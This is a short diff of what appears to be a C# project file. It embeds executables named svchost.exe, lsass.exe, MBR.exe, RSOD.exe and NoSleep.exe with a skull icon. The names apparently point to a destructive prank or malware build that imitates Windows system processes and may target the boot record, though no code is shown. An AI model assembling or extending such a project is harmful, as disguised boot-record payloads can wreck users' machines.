@@ -172,11 +172,10 @@
     <EmbeddedResource Include="Resources\Interop.WMPLib.dll" />
   </ItemGroup>
   <ItemGroup>
-    <EmbeddedResource Include="Resources\RSOD.exe" />
-  </ItemGroup>
-  <ItemGroup>
     <EmbeddedResource Include="Resources\svchost.exe" />
     <EmbeddedResource Include="Resources\lsass.exe" />
+    <EmbeddedResource Include="Resources\MBR.exe" />
+    <EmbeddedResource Include="Resources\RSOD.exe" />
     <EmbeddedResource Include="Resources\NoSleep.exe" />
     <Content Include="skull_real_ico.ico" />
   </ItemGroup>
